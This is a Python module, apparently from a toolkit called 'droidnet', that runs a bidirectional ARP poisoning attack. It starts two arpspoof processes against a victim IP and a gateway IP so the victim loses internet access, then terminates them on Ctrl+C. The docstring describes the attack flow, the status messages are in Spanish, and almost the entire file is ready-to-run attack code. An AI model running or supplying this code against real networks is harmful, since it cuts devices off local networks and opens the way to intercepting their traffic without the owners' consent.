"""
ARP Poison Module — bidirectional ARP spoofing via arpspoof.

Why arpspoof and not Scapy?
    Scapy requires raw socket access at the kernel level. Android
    blocks this even with root. arpspoof uses a native implementation
    compatible with the Android kernel.

Attack flow:
    proc1: arpspoof -i <iface> -t <VICTIM>  <GATEWAY>
        → tells the VICTIM that the GATEWAY is at our MAC
    proc2: arpspoof -i <iface> -t <GATEWAY> <VICTIM>
        → tells the GATEWAY that the VICTIM is at our MAC
    Result: traffic goes nowhere → target loses internet.

On Ctrl+C both processes are terminated; arpspoof sends legitimate
ARP replies during shutdown, restoring the table on both sides.

NOTE: The dsniff package (which provides arpspoof) is NOT available
in Termux. This module only works on Linux (apt install dsniff).
"""

import shutil
import subprocess
import sys
import time

from rich import print as rprint

from droidnet.platform.utils import check_root, get_default_iface


def _arpspoof_available() -> bool:
    """Return True if arpspoof is found in PATH."""
    return shutil.which("arpspoof") is not None


def poison(target_ip: str, gateway_ip: str, iface: str = "wlan0") -> None:
    """
    Run a bidirectional ARP poisoning attack against *target_ip*.

    Blocks until Ctrl+C, then restores the ARP table on both ends.

    Args:
        target_ip  : IP of the device to cut off.
        gateway_ip : IP of the network gateway/router.
        iface      : Network interface to use (default: wlan0).
    """
    if not _arpspoof_available():
        rprint("[bold red][✗] arpspoof no encontrado.[/bold red]")
        rprint("[dim]En Linux: sudo apt install dsniff[/dim]")
        rprint("[dim]En Termux: no disponible (dsniff no existe como paquete Termux)[/dim]")
        return

    rprint(f"[bold red][☠][/bold red] Envenenando ARP...")
    rprint(f"  Víctima : [cyan]{target_ip}[/cyan]")
    rprint(f"  Gateway : [cyan]{gateway_ip}[/cyan]")
    rprint(f"  Iface   : [cyan]{iface}[/cyan]")
    rprint(f"  [dim]Ctrl+C para detener y restaurar.[/dim]\n")

    proc1 = subprocess.Popen(
        ["arpspoof", "-i", iface, "-t", target_ip, gateway_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    proc2 = subprocess.Popen(
        ["arpspoof", "-i", iface, "-t", gateway_ip, target_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    rprint(f"[bold green][✓][/bold green] Ataque activo (PIDs: {proc1.pid}, {proc2.pid})")

    try:
        # Bloquea hasta que cualquiera de los dos arpspoof muera (o Ctrl+C).
        # Si uno cae solo, el ataque queda a medias y debemos parar el otro.
        while proc1.poll() is None and proc2.poll() is None:
            time.sleep(0.5)
        if proc1.poll() is not None or proc2.poll() is not None:
            rprint("[bold yellow][!][/bold yellow] Un arpspoof terminó solo. Limpiando el resto...")
    except KeyboardInterrupt:
        rprint(f"\n[bold yellow][!][/bold yellow] Deteniendo y restaurando red...")
    finally:
        for p in (proc1, proc2):
            if p.poll() is None:
                p.terminate()
                try:
                    p.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    p.kill()
                    p.wait()
        rprint("[bold green][✓][/bold green] Limpio. La víctima recobró internet.")


if __name__ == "__main__":
    if not check_root():
        rprint("[red][✗] Necesitas root.[/red]")
        sys.exit(1)

    if len(sys.argv) < 3:
        rprint("[yellow]Uso: python -m droidnet.modules.spoofer <IP_VICTIMA> <IP_GATEWAY> [IFACE][/yellow]")
        sys.exit(1)

    _target  = sys.argv[1]
    _gateway = sys.argv[2]
    _iface   = sys.argv[3] if len(sys.argv) > 3 else get_default_iface()
    poison(_target, _gateway, _iface)
